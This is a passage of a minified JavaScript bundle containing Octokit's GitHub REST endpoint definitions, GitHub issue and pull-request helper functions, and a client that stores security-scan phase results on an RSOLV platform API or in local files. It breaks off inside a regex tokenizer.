/repos/{owner}/{repo}/hooks/{hook_id}/deliveries/{delivery_id}/attempts"],removeAppAccessRestrictions:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/apps",{},{mapToData:"apps"}],removeCollaborator:["DELETE /repos/{owner}/{repo}/collaborators/{username}"],removeStatusCheckContexts:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks/contexts",{},{mapToData:"contexts"}],removeStatusCheckProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks"],removeTeamAccessRestrictions:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/teams",{},{mapToData:"teams"}],removeUserAccessRestrictions:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/users",{},{mapToData:"users"}],renameBranch:["POST /repos/{owner}/{repo}/branches/{branch}/rename"],replaceAllTopics:["PUT /repos/{owner}/{repo}/topics"],requestPagesBuild:["POST /repos/{owner}/{repo}/pages/builds"],setAdminBranchProtection:["POST /repos/{owner}/{repo}/branches/{branch}/protection/enforce_admins"],setAppAccessRestrictions:["PUT /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/apps",{},{mapToData:"apps"}],setStatusCheckContexts:["PUT /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks/contexts",{},{mapToData:"contexts"}],setTeamAccessRestrictions:["PUT /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/teams",{},{mapToData:"teams"}],setUserAccessRestrictions:["PUT /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/users",{},{mapToData:"users"}],testPushWebhook:["POST /repos/{owner}/{repo}/hooks/{hook_id}/tests"],transfer:["POST /repos/{owner}/{repo}/transfer"],update:["PATCH /repos/{owner}/{repo}"],updateBranchProtection:["PUT /repos/{owner}/{repo}/branches/{branch}/protection"],updateCommitComment:["PATCH /repos/{owner}/{repo}/comments/{comment_id}"],updateDeploymentBranchPolicy:["PUT /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies/{branch_policy_id}"],updateInformationAboutPagesSite:["PUT /repos/{owner}/{repo}/pages"],updateInvitation:["PATCH /repos/{owner}/{repo}/invitations/{invitation_id}"],updateOrgRuleset:["PUT /orgs/{org}/rulesets/{ruleset_id}"],updatePullRequestReviewProtection:["PATCH /repos/{owner}/{repo}/branches/{branch}/protection/required_pull_request_reviews"],updateRelease:["PATCH /repos/{owner}/{repo}/releases/{release_id}"],updateReleaseAsset:["PATCH /repos/{owner}/{repo}/releases/assets/{asset_id}"],updateRepoRuleset:["PUT /repos/{owner}/{repo}/rulesets/{ruleset_id}"],updateStatusCheckPotection:["PATCH /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks",{},{renamed:["repos","updateStatusCheckProtection"]}],updateStatusCheckProtection:["PATCH /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks"],updateWebhook:["PATCH /repos/{owner}/{repo}/hooks/{hook_id}"],updateWebhookConfigForRepo:["PATCH /repos/{owner}/{repo}/hooks/{hook_id}/config"],uploadReleaseAsset:["POST /repos/{owner}/{repo}/releases/{release_id}/assets{?name,label}",{baseUrl:"https://uploads.github.com"}]},search:{code:["GET /search/code"],commits:["GET /search/commits"],issuesAndPullRequests:["GET /search/issues",{},{deprecated:"octokit.rest.search.issuesAndPullRequests() is deprecated, see https://docs.github.com/rest/search/search#search-issues-and-pull-requests"}],labels:["GET /search/labels"],repos:["GET /search/repositories"],topics:["GET /search/topics"],users:["GET /search/users"]},secretScanning:{createPushProtectionBypass:["POST /repos/{owner}/{repo}/secret-scanning/push-protection-bypasses"],getAlert:["GET /repos/{owner}/{repo}/secret-scanning/alerts/{alert_number}"],getScanHistory:["GET /repos/{owner}/{repo}/secret-scanning/scan-history"],listAlertsForEnterprise:["GET /enterprises/{enterprise}/secret-scanning/alerts"],listAlertsForOrg:["GET /orgs/{org}/secret-scanning/alerts"],listAlertsForRepo:["GET /repos/{owner}/{repo}/secret-scanning/alerts"],listLocationsForAlert:["GET /repos/{owner}/{repo}/secret-scanning/alerts/{alert_number}/locations"],updateAlert:["PATCH /repos/{owner}/{repo}/secret-scanning/alerts/{alert_number}"]},securityAdvisories:{createFork:["POST /repos/{owner}/{repo}/security-advisories/{ghsa_id}/forks"],createPrivateVulnerabilityReport:["POST /repos/{owner}/{repo}/security-advisories/reports"],createRepositoryAdvisory:["POST /repos/{owner}/{repo}/security-advisories"],createRepositoryAdvisoryCveRequest:["POST /repos/{owner}/{repo}/security-advisories/{ghsa_id}/cve"],getGlobalAdvisory:["GET /advisories/{ghsa_id}"],getRepositoryAdvisory:["GET /repos/{owner}/{repo}/security-advisories/{ghsa_id}"],listGlobalAdvisories:["GET /advisories"],listOrgRepositoryAdvisories:["GET /orgs/{org}/security-advisories"],listRepositoryAdvisories:["GET /repos/{owner}/{repo}/security-advisories"],updateRepositoryAdvisory:["PATCH /repos/{owner}/{repo}/security-advisories/{ghsa_id}"]},teams:{addOrUpdateMembershipForUserInOrg:["PUT /orgs/{org}/teams/{team_slug}/memberships/{username}"],addOrUpdateProjectPermissionsInOrg:["PUT /orgs/{org}/teams/{team_slug}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.addOrUpdateProjectPermissionsInOrg() is deprecated, see https://docs.github.com/rest/teams/teams#add-or-update-team-project-permissions"}],addOrUpdateProjectPermissionsLegacy:["PUT /teams/{team_id}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.addOrUpdateProjectPermissionsLegacy() is deprecated, see https://docs.github.com/rest/teams/teams#add-or-update-team-project-permissions-legacy"}],addOrUpdateRepoPermissionsInOrg:["PUT /orgs/{org}/teams/{team_slug}/repos/{owner}/{repo}"],checkPermissionsForProjectInOrg:["GET /orgs/{org}/teams/{team_slug}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.checkPermissionsForProjectInOrg() is deprecated, see https://docs.github.com/rest/teams/teams#check-team-permissions-for-a-project"}],checkPermissionsForProjectLegacy:["GET /teams/{team_id}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.checkPermissionsForProjectLegacy() is deprecated, see https://docs.github.com/rest/teams/teams#check-team-permissions-for-a-project-legacy"}],checkPermissionsForRepoInOrg:["GET /orgs/{org}/teams/{team_slug}/repos/{owner}/{repo}"],create:["POST /orgs/{org}/teams"],createDiscussionCommentInOrg:["POST /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments"],createDiscussionInOrg:["POST /orgs/{org}/teams/{team_slug}/discussions"],deleteDiscussionCommentInOrg:["DELETE /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}"],deleteDiscussionInOrg:["DELETE /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}"],deleteInOrg:["DELETE /orgs/{org}/teams/{team_slug}"],getByName:["GET /orgs/{org}/teams/{team_slug}"],getDiscussionCommentInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}"],getDiscussionInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}"],getMembershipForUserInOrg:["GET /orgs/{org}/teams/{team_slug}/memberships/{username}"],list:["GET /orgs/{org}/teams"],listChildInOrg:["GET /orgs/{org}/teams/{team_slug}/teams"],listDiscussionCommentsInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments"],listDiscussionsInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions"],listForAuthenticatedUser:["GET /user/teams"],listMembersInOrg:["GET /orgs/{org}/teams/{team_slug}/members"],listPendingInvitationsInOrg:["GET /orgs/{org}/teams/{team_slug}/invitations"],listProjectsInOrg:["GET /orgs/{org}/teams/{team_slug}/projects",{},{deprecated:"octokit.rest.teams.listProjectsInOrg() is deprecated, see https://docs.github.com/rest/teams/teams#list-team-projects"}],listProjectsLegacy:["GET /teams/{team_id}/projects",{},{deprecated:"octokit.rest.teams.listProjectsLegacy() is deprecated, see https://docs.github.com/rest/teams/teams#list-team-projects-legacy"}],listReposInOrg:["GET /orgs/{org}/teams/{team_slug}/repos"],removeMembershipForUserInOrg:["DELETE /orgs/{org}/teams/{team_slug}/memberships/{username}"],removeProjectInOrg:["DELETE /orgs/{org}/teams/{team_slug}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.removeProjectInOrg() is deprecated, see https://docs.github.com/rest/teams/teams#remove-a-project-from-a-team"}],removeProjectLegacy:["DELETE /teams/{team_id}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.removeProjectLegacy() is deprecated, see https://docs.github.com/rest/teams/teams#remove-a-project-from-a-team-legacy"}],removeRepoInOrg:["DELETE /orgs/{org}/teams/{team_slug}/repos/{owner}/{repo}"],updateDiscussionCommentInOrg:["PATCH /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}"],updateDiscussionInOrg:["PATCH /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}"],updateInOrg:["PATCH /orgs/{org}/teams/{team_slug}"]},users:{addEmailForAuthenticated:["POST /user/emails",{},{renamed:["users","addEmailForAuthenticatedUser"]}],addEmailForAuthenticatedUser:["POST /user/emails"],addSocialAccountForAuthenticatedUser:["POST /user/social_accounts"],block:["PUT /user/blocks/{username}"],checkBlocked:["GET /user/blocks/{username}"],checkFollowingForUser:["GET /users/{username}/following/{target_user}"],checkPersonIsFollowedByAuthenticated:["GET /user/following/{username}"],createGpgKeyForAuthenticated:["POST /user/gpg_keys",{},{renamed:["users","createGpgKeyForAuthenticatedUser"]}],createGpgKeyForAuthenticatedUser:["POST /user/gpg_keys"],createPublicSshKeyForAuthenticated:["POST /user/keys",{},{renamed:["users","createPublicSshKeyForAuthenticatedUser"]}],createPublicSshKeyForAuthenticatedUser:["POST /user/keys"],createSshSigningKeyForAuthenticatedUser:["POST /user/ssh_signing_keys"],deleteEmailForAuthenticated:["DELETE /user/emails",{},{renamed:["users","deleteEmailForAuthenticatedUser"]}],deleteEmailForAuthenticatedUser:["DELETE /user/emails"],deleteGpgKeyForAuthenticated:["DELETE /user/gpg_keys/{gpg_key_id}",{},{renamed:["users","deleteGpgKeyForAuthenticatedUser"]}],deleteGpgKeyForAuthenticatedUser:["DELETE /user/gpg_keys/{gpg_key_id}"],deletePublicSshKeyForAuthenticated:["DELETE /user/keys/{key_id}",{},{renamed:["users","deletePublicSshKeyForAuthenticatedUser"]}],deletePublicSshKeyForAuthenticatedUser:["DELETE /user/keys/{key_id}"],deleteSocialAccountForAuthenticatedUser:["DELETE /user/social_accounts"],deleteSshSigningKeyForAuthenticatedUser:["DELETE /user/ssh_signing_keys/{ssh_signing_key_id}"],follow:["PUT /user/following/{username}"],getAuthenticated:["GET /user"],getById:["GET /user/{account_id}"],getByUsername:["GET /users/{username}"],getContextForUser:["GET /users/{username}/hovercard"],getGpgKeyForAuthenticated:["GET /user/gpg_keys/{gpg_key_id}",{},{renamed:["users","getGpgKeyForAuthenticatedUser"]}],getGpgKeyForAuthenticatedUser:["GET /user/gpg_keys/{gpg_key_id}"],getPublicSshKeyForAuthenticated:["GET /user/keys/{key_id}",{},{renamed:["users","getPublicSshKeyForAuthenticatedUser"]}],getPublicSshKeyForAuthenticatedUser:["GET /user/keys/{key_id}"],getSshSigningKeyForAuthenticatedUser:["GET /user/ssh_signing_keys/{ssh_signing_key_id}"],list:["GET /users"],listAttestations:["GET /users/{username}/attestations/{subject_digest}"],listBlockedByAuthenticated:["GET /user/blocks",{},{renamed:["users","listBlockedByAuthenticatedUser"]}],listBlockedByAuthenticatedUser:["GET /user/blocks"],listEmailsForAuthenticated:["GET /user/emails",{},{renamed:["users","listEmailsForAuthenticatedUser"]}],listEmailsForAuthenticatedUser:["GET /user/emails"],listFollowedByAuthenticated:["GET /user/following",{},{renamed:["users","listFollowedByAuthenticatedUser"]}],listFollowedByAuthenticatedUser:["GET /user/following"],listFollowersForAuthenticatedUser:["GET /user/followers"],listFollowersForUser:["GET /users/{username}/followers"],listFollowingForUser:["GET /users/{username}/following"],listGpgKeysForAuthenticated:["GET /user/gpg_keys",{},{renamed:["users","listGpgKeysForAuthenticatedUser"]}],listGpgKeysForAuthenticatedUser:["GET /user/gpg_keys"],listGpgKeysForUser:["GET /users/{username}/gpg_keys"],listPublicEmailsForAuthenticated:["GET /user/public_emails",{},{renamed:["users","listPublicEmailsForAuthenticatedUser"]}],listPublicEmailsForAuthenticatedUser:["GET /user/public_emails"],listPublicKeysForUser:["GET /users/{username}/keys"],listPublicSshKeysForAuthenticated:["GET /user/keys",{},{renamed:["users","listPublicSshKeysForAuthenticatedUser"]}],listPublicSshKeysForAuthenticatedUser:["GET /user/keys"],listSocialAccountsForAuthenticatedUser:["GET /user/social_accounts"],listSocialAccountsForUser:["GET /users/{username}/social_accounts"],listSshSigningKeysForAuthenticatedUser:["GET /user/ssh_signing_keys"],listSshSigningKeysForUser:["GET /users/{username}/ssh_signing_keys"],setPrimaryEmailVisibilityForAuthenticated:["PATCH /user/email/visibility",{},{renamed:["users","setPrimaryEmailVisibilityForAuthenticatedUser"]}],setPrimaryEmailVisibilityForAuthenticatedUser:["PATCH /user/email/visibility"],unblock:["DELETE /user/blocks/{username}"],unfollow:["DELETE /user/following/{username}"],updateAuthenticated:["PATCH /user"]}},hz=DC});function V2(X){let J={};for(let Q of PX.keys())J[Q]=new Proxy({octokit:X,scope:Q,cache:{}},wC);return J}function NC(X,J,Q,Y,W){let G=X.request.defaults(Y);function H(...z){let $=G.endpoint.merge(...z);if(W.mapToData)return $=Object.assign({},$,{data:$[W.mapToData],[W.mapToData]:void 0}),G($);if(W.renamed){let[V,K]=W.renamed;X.log.warn(`octokit.${J}.${Q}() has been renamed to octokit.${V}.${K}()`)}if(W.deprecated)X.log.warn(W.deprecated);if(W.renamedParameters){let V=G.endpoint.merge(...z);for(let[K,Z]of Object.entries(W.renamedParameters))if(K in V){if(X.log.warn(`"${K}" parameter is deprecated for "octokit.${J}.${Q}()". Use "${Z}" instead`),!(Z in V))V[Z]=V[K];delete V[K]}return G(V)}return G(...z)}return Object.assign(H,G)}var PX,wC;var gz=s(()=>{yz();PX=new Map;for(let[X,J]of Object.entries(hz))for(let[Q,Y]of Object.entries(J)){let[W,G,H]=Y,[z,$]=W.split(/ /),V=Object.assign({method:z,url:$},G);if(!PX.has(X))PX.set(X,new Map);PX.get(X).set(Q,{scope:X,methodName:Q,endpointDefaults:V,decorations:H})}wC={has({scope:X},J){return PX.get(X).has(J)},getOwnPropertyDescriptor(X,J){return{value:this.get(X,J),configurable:!0,writable:!0,enumerable:!0}},defineProperty(X,J,Q){return Object.defineProperty(X.cache,J,Q),!0},deleteProperty(X,J){return delete X.cache[J],!0},ownKeys({scope:X}){return[...PX.get(X).keys()]},set(X,J,Q){return X.cache[J]=Q},get({octokit:X,scope:J,cache:Q},Y){if(Q[Y])return Q[Y];let W=PX.get(J).get(Y);if(!W)return;let{endpointDefaults:G,decorations:H}=W;if(H)Q[Y]=NC(X,J,Y,G,H);else Q[Y]=X.request.defaults(G);return Q[Y]}}});function LC(X){return{rest:V2(X)}}function K2(X){let J=V2(X);return{...J,rest:J}}var mz=s(()=>{xz();gz();LC.VERSION=$2;K2.VERSION=$2});var uz="21.1.1";var cz=()=>{};var lz;var pz=s(()=>{Tz();kz();fz();mz();cz();lz=W2.plugin(G2,K2,z2).defaults({userAgent:`octokit-rest.js/${uz}`})});var _8={};N0(_8,{updateIssue:()=>_C,removeLabel:()=>kC,getRepositoryDetails:()=>fJ,getIssue:()=>IC,getGitHubClient:()=>Z0,createPullRequest:()=>TC,createOrUpdateFile:()=>PC,createIssueComment:()=>CC,createBranch:()=>SC,addLabels:()=>EC});function Z0(X){if(O5)return O5;let J=X?.repoToken||process.env.GITHUB_TOKEN;if(!J)throw U.error("No GitHub token found"),Error("No GitHub token found. Please set GITHUB_TOKEN environment variable or provide repoToken in config.");return O5=new lz({auth:J,timeZone:"UTC"}),U.debug("GitHub API client created"),O5}async function fJ(X,J){try{let Q=Z0(),{data:Y}=await Q.repos.get({owner:X,repo:J});return{id:Y.id,name:Y.name,fullName:Y.full_name,owner:Y.owner.login,defaultBranch:Y.default_branch,language:Y.language,private:Y.private}}catch(Q){throw U.error(`Error getting repository details for ${X}/${J}`,Q),Error(`Failed to get repository details: ${Q instanceof Error?Q.message:String(Q)}`)}}async function IC(X,J,Q){try{let Y=Z0(),{data:W}=await Y.issues.get({owner:X,repo:J,issue_number:Q});return{id:W.id.toString(),number:W.number,title:W.title,body:W.body||"",labels:W.labels.map((G)=>typeof G==="string"?G:G.name||""),assignees:W.assignees?.map((G)=>G.login)||[],repository:{owner:X,name:J,fullName:`${X}/${J}`,defaultBranch:"main"},source:"github",createdAt:W.created_at,updatedAt:W.updated_at,metadata:{state:W.state,user:W.user?.login}}}catch(Y){return U.error(`Error getting issue #${Q} from ${X}/${J}`,Y),null}}async function CC(X,J,Q,Y){try{await Z0().issues.createComment({owner:X,repo:J,issue_number:Q,body:Y}),U.info(`Comment created on issue #${Q}`)}catch(W){throw U.error(`Error creating comment on issue #${Q}`,W),Error(`Failed to create issue comment: ${W instanceof Error?W.message:String(W)}`)}}async function PC(X,J,Q,Y,W,G){try{let H=Z0(),z;try{let{data:$}=await H.repos.getContent({owner:X,repo:J,path:Q,ref:G});if(!Array.isArray($))z=$.sha}catch($){U.debug(`File ${Q} doesn't exist, will create it`)}await H.repos.createOrUpdateFileContents({owner:X,repo:J,path:Q,message:W,content:Buffer.from(Y).toString("base64"),branch:G,sha:z}),U.info(`File ${Q} created or updated on branch ${G}`)}catch(H){throw U.error(`Error creating or updating file ${Q}`,H),Error(`Failed to create or update file: ${H instanceof Error?H.message:String(H)}`)}}async function SC(X,J,Q,Y){try{let W=Z0(),G=Y||"main",{data:H}=await W.git.getRef({owner:X,repo:J,ref:`heads/${G}`});await W.git.createRef({owner:X,repo:J,ref:`refs/heads/${Q}`,sha:H.object.sha}),U.info(`Branch ${Q} created from ${G}`)}catch(W){throw U.error(`Error creating branch ${Q}`,W),Error(`Failed to create branch: ${W instanceof Error?W.message:String(W)}`)}}async function TC(X,J,Q,Y,W,G="main"){try{let H=Z0(),{data:z}=await H.pulls.create({owner:X,repo:J,title:Q,body:Y,head:W,base:G});return U.info(`Pull request #${z.number} created: ${z.html_url}`),{number:z.number,html_url:z.html_url}}catch(H){throw U.error("Error creating pull request",H),Error(`Failed to create pull request: ${H instanceof Error?H.message:String(H)}`)}}async function _C(X,J,Q,Y){let W=`https://api.github.com/repos/${X}/${J}/issues/${Q}`,G=await fetch(W,{method:"PATCH",headers:{Authorization:`token ${process.env.GITHUB_TOKEN}`,Accept:"application/vnd.github.v3+json","Content-Type":"application/json"},body:JSON.stringify(Y)});if(!G.ok)throw Error(`Failed to update issue: ${G.statusText}`)}async function EC(X,J,Q,Y){let W=`https://api.github.com/repos/${X}/${J}/issues/${Q}/labels`,G=await fetch(W,{method:"POST",headers:{Authorization:`token ${process.env.GITHUB_TOKEN}`,Accept:"application/vnd.github.v3+json","Content-Type":"application/json"},body:JSON.stringify({labels:Y})});if(!G.ok)throw Error(`Failed to add labels: ${G.statusText}`)}async function kC(X,J,Q,Y){let W=`https://api.github.com/repos/${X}/${J}/issues/${Q}/labels/${encodeURIComponent(Y)}`,G=await fetch(W,{method:"DELETE",headers:{Authorization:`token ${process.env.GITHUB_TOKEN}`,Accept:"application/vnd.github.v3+json"}});if(!G.ok&&G.status!==404)throw Error(`Failed to remove label: ${G.statusText}`)}var O5=null;var z9=s(()=>{pz();I1()});class xJ{apiKey;baseUrl;headers;usePlatformStorage;constructor(X,J=process.env.RSOLV_API_URL||"https://api.rsolv.dev"){this.apiKey=X;this.baseUrl=J;this.headers=new Headers({"Content-Type":"application/json","X-API-Key":X}),this.usePlatformStorage=process.env.USE_PLATFORM_STORAGE!=="false"}async storePhaseResults(X,J,Q){if(!this.usePlatformStorage)return this.storeLocally(X,J,Q);let W={scan:"scan",validate:"validation",mitigate:"mitigation"}[X]||X,G;if(X==="scan")G=J.scan;else if(X==="validate"||X==="mitigate"){let H=J[X];if(!Q.issueNumber)throw Error(`Issue number is required for ${X} phase`);if(!H)throw Error(`No ${X} data found for issue ${Q.issueNumber}`);let z=String(Q.issueNumber);if(G=H[z],!G)throw Error(`No ${X} data found for issue ${Q.issueNumber}`)}try{let H={phase:W,data:G,...Q},z=`${this.baseUrl}/api/v1/phases/store`;console.log("[PhaseDataClient] Storing phase data:",{url:z,phase:W,hasData:!!G,dataType:typeof G,repo:Q.repo,issueNumber:Q.issueNumber,commitSha:Q.commitSha?.substring(0,8)}),console.log("[PhaseDataClient] Full request payload:",JSON.stringify(H,null,2));let $=await fetch(z,{method:"POST",headers:this.headers,body:JSON.stringify(H)});if(!$.ok){let K=await $.text().catch(()=>"Unable to read error response"),Z={};throw $.headers.forEach((q,B)=>{Z[B]=q}),console.error("[PhaseDataClient] Platform storage failed:",{url:z,status:$.status,statusText:$.statusText,headers:Z,errorBody:K}),Error(`Platform storage failed: ${$.statusText}`)}return{...await $.json(),storage:"platform"}}catch(H){return console.warn("Platform storage failed, falling back to local:",H),this.storeLocally(X,J,Q)}}async retrievePhaseResults(X,J,Q){if(!this.usePlatformStorage)return this.retrieveLocally(X,J,Q);try{let Y=await fetch(`${this.baseUrl}/api/v1/phases/retrieve?repo=${encodeURIComponent(X)}&issue=${J}&commit=${encodeURIComponent(Q)}`,{headers:this.headers});if(Y.status===404)return this.retrieveLocally(X,J,Q);if(!Y.ok)throw Error(`Platform retrieval failed: ${Y.statusText}`);let W=await Y.json();if(console.log("[PhaseDataClient] Retrieved from platform:",{hasValidation:!!W?.validation,hasValidate:!!W?.validate,keys:Object.keys(W||{})}),W&&W.validation&&!W.validate)console.log("[PhaseDataClient] Mapping validation -> validate"),W.validate=W.validation,delete W.validation;if(W&&W.mitigation&&!W.mitigate)console.log("[PhaseDataClient] Mapping mitigation -> mitigate"),W.mitigate=W.mitigation,delete W.mitigation;return console.log("[PhaseDataClient] Returning data with keys:",Object.keys(W||{})),W}catch(Y){return console.warn("Platform retrieval failed, falling back to local:",Y),this.retrieveLocally(X,J,Q)}}async validatePhaseTransition(X,J,Q){if(await this.getCurrentCommitSha()!==Q)return!1;return{scan:["validate"],validate:["mitigate"],mitigate:[]}[X]?.includes(J)??!1}async storeLocally(X,J,Q){let Y=await import("fs/promises"),W=await import("path"),G=".rsolv/phase-data";await Y.mkdir(".rsolv/phase-data",{recursive:!0});let H=`${Q.repo.replace("/","-")}-${Q.issueNumber||"scan"}-${X}.json`,z=W.join(".rsolv/phase-data",H);return await Y.writeFile(z,JSON.stringify({phase:X,data:J,metadata:Q,timestamp:new Date().toISOString()},null,2)),{success:!0,storage:"local",warning:"Platform unavailable, stored locally"}}async retrieveLocally(X,J,Q){let Y=await import("fs/promises"),W=await import("path"),G=".rsolv/phase-data",z=`${X.replace("/","-")}-${J}-`;try{let V=(await Y.readdir(".rsolv/phase-data")).filter((Z)=>Z.startsWith(z)),K={};for(let Z of V){let q=await Y.readFile(W.join(".rsolv/phase-data",Z),"utf-8"),B=JSON.parse(q);if(B.metadata.commitSha===Q)Object.assign(K,B.data)}return Object.keys(K).length>0?K:null}catch{return null}}async getCurrentCommitSha(){if(process.env.GITHUB_SHA)return process.env.GITHUB_SHA.trim();try{let{execSync:X}=await import("child_process");return X("git rev-parse HEAD").toString().trim()}catch(X){return console.warn("[PhaseDataClient] Git not available, using fallback commit SHA"),"no-git-available"}}async getPhaseTestInfo(X){return{branchName:`rsolv/validate/${X}`,testPath:`__tests__/security/rsolv-${X}.test.js`,framework:"jest",command:`npm test -- __tests__/security/rsolv-${X}.test.js`}}async saveTestResults(X){console.log("[PhaseDataClient] Saving test results:",X)}async calculateTrustScore(X,J){if(!X&&J)return 100;else if(X&&J)return 50;else return 0}async storeFailureDetails(X,J,Q){let Y=await import("fs/promises"),W=await import("path"),G=".rsolv/observability/failures";await Y.mkdir(".rsolv/observability/failures",{recursive:!0});let H=`${X.replace("/","-")}-${J}-failure-${Date.now()}.json`,z=W.join(".rsolv/observability/failures",H);await Y.writeFile(z,JSON.stringify(Q,null,2)),console.log(`[PhaseDataClient] Stored failure details: ${z}`)}async storeRetryAttempt(X,J,Q){let Y=await import("fs/promises"),W=await import("path"),G=".rsolv/observability/retries";await Y.mkdir(".rsolv/observability/retries",{recursive:!0});let H=`${X.replace("/","-")}-${J}-retry-${Q.attemptNumber}.json`,z=W.join(".rsolv/observability/retries",H);await Y.writeFile(z,JSON.stringify(Q,null,2)),console.log(`[PhaseDataClient] Stored retry attempt ${Q.attemptNumber}/${Q.maxRetries}: ${z}`)}async storeTrustScore(X,J,Q){let Y=await import("fs/promises"),W=await import("path"),G=".rsolv/observability/trust-scores";await Y.mkdir(".rsolv/observability/trust-scores",{recursive:!0});let H=`${X.replace("/","-")}-${J}-trust-score.json`,z=W.join(".rsolv/observability/trust-scores",H);await Y.writeFile(z,JSON.stringify(Q,null,2)),console.log(`[PhaseDataClient] Stored trust score (${Q.trustScore}): ${z}`)}async storeExecutionTimeline(X,J,Q){let Y=await import("fs/promises"),W=await import("path"),G=".rsolv/observability/timelines";await Y.mkdir(".rsolv/observability/timelines",{recursive:!0});let H=`${X.replace("/","-")}-${J}-timeline.json`,z=W.join(".rsolv/observability/timelines",H);await Y.writeFile(z,JSON.stringify(Q,null,2)),console.log(`[PhaseDataClient] Stored execution timeline (${Q.totalDurationMs}ms): ${z}`)}}var nz=v((az)=>{Object.defineProperty(az,"__esModule",{value:!0})});var oz=v((sz)=>{Object.defineProperty(sz,"__esModule",{value:!0});sz.types=void 0;var fC;(function(X){X[X.ROOT=0]="ROOT",X[X.GROUP=1]="GROUP",X[X.POSITION=2]="POSITION",X[X.SET=3]="SET",X[X.RANGE=4]="RANGE",X[X.REPETITION=5]="REPETITION",X[X.REFERENCE=6]="REFERENCE",X[X.CHAR=7]="CHAR"})(fC=sz.types||(sz.types={}))});var ez=v((tz)=>{Object.defineProperty(tz,"__esModule",{value:!0})});var I6=v((L6)=>{var xC=L6&&L6.__createBinding||(Object.create?function(X,J,Q,Y){if(Y===void 0)Y=Q;Object.defineProperty(X,Y,{enumerable:!0,get:function(){return J[Q]}})}:function(X,J,Q,Y){if(Y===void 0)Y=Q;X[Y]=J[Q]}),Z2=L6&&L6.__exportStar||function(X,J){for(var Q in X)if(Q!=="default"&&!Object.prototype.hasOwnProperty.call(J,Q))xC(J,X,Q)};Object.defineProperty(L6,"__esModule",{value:!0});Z2(nz(),L6);Z2(oz(),L6);Z2(ez(),L6)});var F5=v((Y$)=>{Object.defineProperty(Y$,"__esModule",{value:!0});Y$.anyChar=Y$.notWhitespace=Y$.whitespace=Y$.notInts=Y$.ints=Y$.notWords=Y$.words=void 0;var Y0=I6(),X$=()=>[{type:Y0.types.RANGE,from:48,to:57}],J$=()=>[{type:Y0.types.CHAR,value:95},{type:Y0.types.RANGE,from:97,to:122},{type:Y0.types.RANGE,from:65,to:90},{type:Y0.types.RANGE,from:48,to:57}],Q$=()=>[{type:Y0.types.CHAR,value:9},{type:Y0.types.CHAR,value:10},{type:Y0.types.CHAR,value:11},{type:Y0.types.CHAR,value:12},{type:Y0.types.CHAR,value:13},{type:Y0.types.CHAR,value:32},{type:Y0.types.CHAR,value:160},{type:Y0.types.CHAR,value:5760},{type:Y0.types.RANGE,from:8192,to:8202},{type:Y0.types.CHAR,value:8232},{type:Y0.types.CHAR,value:8233},{type:Y0.types.CHAR,value:8239},{type:Y0.types.CHAR,value:8287},{type:Y0.types.CHAR,value:12288},{type:Y0.types.CHAR,value:65279}],hC=()=>[{type:Y0.types.CHAR,value:10},{type:Y0.types.CHAR,value:13},{type:Y0.types.CHAR,value:8232},{type:Y0.types.CHAR,value:8233}];Y$.words=()=>({type:Y0.types.SET,set:J$(),not:!1});Y$.notWords=()=>({type:Y0.types.SET,set:J$(),not:!0});Y$.ints=()=>({type:Y0.types.SET,set:X$(),not:!1});Y$.notInts=()=>({type:Y0.types.SET,set:X$(),not:!0});Y$.whitespace=()=>({type:Y0.types.SET,set:Q$(),not:!1});Y$.notWhitespace=()=>({type:Y0.types.SET,set:Q$(),not:!0});Y$.anyChar=()=>({type:Y0.types.SET,set:hC(),not:!0})});var H$=v((D9)=>{var pC=D9&&D9.__createBinding||(Object.create?function(X,J,Q,Y){if(Y===void 0)Y=Q;Object.defineProperty(X,Y,{enumerable:!0,get:function(){return J[Q]}})}:function(X,J,Q,Y){if(Y===void 0)Y=Q;X[Y]=J[Q]}),dC=D9&&D9.__setModuleDefault||(Object.create?function(X,J){Object.defineProperty(X,"default",{enumerable:!0,value:J})}:function(X,J){X.default=J}),iC=D9&&D9.__importStar||function(X){if(X&&X.__esModule)return X;var J={};if(X!=null){for(var Q in X)if(Q!=="default"&&Object.prototype.hasOwnProperty.call(X,Q))pC(J,X,Q)}return dC(J,X),J};Object.defineProperty(D9,"__esModule",{value:!0});D9.tokenizeClass=D9.strToChars=void 0;var G$=I6(),E8=iC(F5()),rC="@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^ ?";D9.strToChars=(X)=>{let J=/(\[\\b\])|(\\)?\\(?:u([A-F0-9]{4})|x([A-F0-9]{2})|c([@A-Z[\\\]^?])|([0tnvfr]))/g;return X.replace(J,(Q,Y,W,G,H,z,$)=>{if(W)return Q;let V=Y?8:G?parseInt(G,16):H?parseInt(H,16):z?rC.indexOf(z):{0:0,t:9,n:10,v:11,f:12,r:13}[$],K=String.fromCharCode(V);return/[[\]{}^$.|?*+()]/.test(K)?`\\${K}`:K})};D9.tokenizeClass=(X,J)=>{var Q,Y,W,G,H,z,$;let 